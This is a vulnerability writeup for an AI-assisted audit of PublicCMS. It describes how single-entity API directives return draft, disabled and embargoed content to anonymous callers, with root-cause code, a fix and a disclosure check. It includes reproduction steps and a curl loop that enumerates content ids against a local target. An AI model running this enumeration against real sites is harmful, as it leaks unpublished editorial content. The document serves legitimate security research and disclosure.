# VULN-005 — Unauthenticated disclosure of draft / disabled / scheduled content

## Header

- **Title:** Unauthenticated disclosure of draft/disabled/scheduled content and hidden single entities via `Cms*Directive`
- **ID:** VULN-005
- **Severity:** **Medium** (High for pre-publication/embargo content in a news/PR CMS) — CVSS 3.1 **5.3** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
- **Status:** CONFIRMED (dynamic)
- **Affected version / commit:** PublicCMS `V5.202608.a`, commit `e85ab023a22b19bff5b5b0c944440ab614df467f`
- **Auth required:** **None** (unauthenticated over `/api/*`)
- **Known-issue status:** sibling of **CVE-2026-8737**; the disabled/date-window angle is possibly novel.

## Summary

The single-entity CMS read directives (`cms/content`, `cms/vote`, `cms/survey`, `cms/comment`, …) return an entity after checking **only** that it belongs to the current site — never its status, disabled flag, or publish/expiry window. The sibling *list* directives, for the same anonymous caller, correctly apply the public-visibility predicate. So an anonymous attacker who supplies (or enumerates) a numeric id reads metadata for content the editorial workflow deliberately kept non-public: drafts, pending/rejected items, disabled entities, embargoed (future-dated) and expired content.

## Technical details

### Root cause

`targets/PublicCMS/publiccms-parent/publiccms-core/src/main/java/com/publiccms/views/directive/cms/CmsContentDirective.java:95-123` — only a site check:

```java
if (CommonUtils.notEmpty(id)) {
    CmsContent entity = service.getEntity(id);
    if (null != entity && site.getId() == entity.getSiteId()) {   // <-- no STATUS_NORMAL / !disabled / publishDate / expiryDate
        ...
        handler.put("object", entity);
        handler.render();
    }
}
```

Contrast the list directive `CmsContentListDirective.java:130-139`, which **does** restrict the anonymous branch:

```java
queryEntity.setStatus(CmsContentService.STATUS_NORMAL_ARRAY);
queryEntity.setDisabled(false);
queryEntity.setEndPublishDate(now);      // no future-dated
queryEntity.setExpiryDate(now);          // no expired
```

### Data flow

Anonymous caller → `GET /api/directive/cms/content?id=<n>` → `service.getEntity(id)` by PK → only `site.getId() == entity.getSiteId()` is checked → the entity's title, description, author, cover URL and other metadata are serialized, regardless of `status` (0/2/3 = draft/pending/rejected), `disabled=true`, future `publishDate`, or past `expiryDate`. These directives don't override `needAppToken()`/`needUserToken()`, so they run for anonymous HTTP callers. The same defect is confirmed across the sibling single-entity directives. (Full article bodies stay gated behind the app-token `advanced` path; metadata leaks unauthenticated.)

### Why existing mitigations don't apply

The list path proves the visibility predicate exists and is applied elsewhere — the single-entity path simply omits it. Site resolution is itself attacker-controlled via the `Host` header (see [VULN-001](../VULN-001/writeup.md)), so an attacker can select whichever tenant holds the content.

## Reproduction

1. **Bring up the target** (see the manifest `## Runtime`):
   ```bash
   cd targets/PublicCMS
   DOCKER_BUILDKIT=1 COMPOSE_DOCKER_CLI_BUILD=1 docker compose -p cvehunt_publiccms up -d --build
   bash ../../claude_audit/PublicCMS/setup/install.sh   # first run only
   ```
2. **Run the exploit** from this directory:
   ```bash
   cd claude_audit/PublicCMS/exploits/VULN-005 && ./automation.sh
   ```
   The script plants a DRAFT (`status=0`, title `DRAFT_SECRET_<suffix>`) via the site-2 demo admin, then makes two anonymous requests (`Host: site2.dev.publiccms.com`, no cookie): the single-entity read of the draft id, and the public list. It asserts the draft is returned by the single-entity directive but absent from the list.
3. **Expected output:** `[OK] exploit confirmed — anonymous caller read a DRAFT (status=0) that the list directive hides.`
4. **Confirm exploitation:** `evidence/single_entity_leak.json` contains `{"object":{"title":"DRAFT_SECRET_…","status":0,…}}`; `evidence/public_list.json` shows the draft id absent (only the public id). To enumerate:
   ```bash
   for id in $(seq 1 500); do
     curl -s "http://localhost:20000/api/directive/cms/content?id=$id" | grep -q '"title"' && echo "leaked $id"
   done
   ```

- See `request.http` / `response.txt` for the requests, `evidence/` for the differential, and `run.log` for the full run.

## Impact

Anonymous pre-publication leak of unreleased/embargoed/draft editorial content and hidden entity metadata by id enumeration — a business-High for news, PR and investor-relations sites where embargo is the whole point. Enumerated ids also feed [VULN-007](../VULN-007/writeup.md) (cross-user content tampering targets a known id).

## Suggested fix

Apply the same public-visibility predicate the list directive already uses, to every single-entity read directive:

```java
if (null != entity && site.getId() == entity.getSiteId()
        && !handler.inHttp()                                   // template channel keeps full access
        || callerIsAuthorizedForNonPublic(handler, entity)) {
    // ... render
}
```

Concretely, on the anonymous HTTP path require:
```java
boolean publiclyVisible =
        ArrayUtils.contains(CmsContentService.STATUS_NORMAL_ARRAY, entity.getStatus())
        && !entity.isDisabled()
        && entity.getEndPublishDate() != null && !entity.getEndPublishDate().after(now)
        && (entity.getExpiryDate() == null || entity.getExpiryDate().after(now));
if (publiclyVisible) { handler.put("object", entity); handler.render(); }
```

Apply the same fix to `CmsVoteDirective`, `CmsSurveyDirective`, `CmsCommentDirective`, `CmsContentProductDirective`, and `CmsUserCollectionDirective`. A shared base helper for "is this entity publicly visible for an anonymous caller" prevents the class recurring.

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 75 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. `PublicCMS CVE 2025 2026 security advisory sanluan` + full PublicCMS CVE listing (releasealert.dev, 49 CVEs) — no entry for `CmsContentDirective`, `/api/directive/cms/content`, draft / disabled / scheduled content, or single-entity directive visibility
2. GitHub Advisory Database search `publiccms`, pages 1–3 (58 advisories) — the only directive-related entries are CVE-2026-8737 (`TradeAddressListDirective`), CVE-2026-8740 (`TemplateResultDirective`) and CVE-2022-29784 (`SysConfigDataDirective`)
3. GitHub issue search `register OR emailChecked OR contentCreate OR refund OR directive OR vote OR race OR draft OR userId` — 4 results (#125, #113, #108, #107), all trade / SSTI; nothing on cms directives
4. GitHub issue search `xss OR vulnerability OR security OR CVE OR 漏洞` (43 issues) — no report of draft / unpublished content disclosure
5. CVE-2022-29784 (Tenable) — information leak in `SysConfigDataDirective`, fixed by commit d8d7626; different directive and data
6. (Planned WebSearch `PublicCMS CmsContentDirective draft content disclosure` could not be executed — shared search budget exhausted; replaced by direct fetches 2–5)

**Related but distinct public references** (same class or component, not this bug):
- CVE-2026-8737 — sibling anonymous directive (`TradeAddressListDirective`) leaking by `userId` / `id`; different directive and data, same base-class token gap
- CVE-2022-29784 — `SysConfigDataDirective` information leak; different directive
- CVE-2023-48204 — information disclosure via `api/method/getHtml` with appToken; different channel

**Reasoning:** No public reference names the single-entity `Cms*Directive` read path or the missing status / disabled / publish-window predicate. The anonymous directive API has produced several public CVEs (so the surface is well known and more private reports likely exist), but each public entry targets a different directive and data set; the draft / embargo disclosure angle here appears undisclosed.
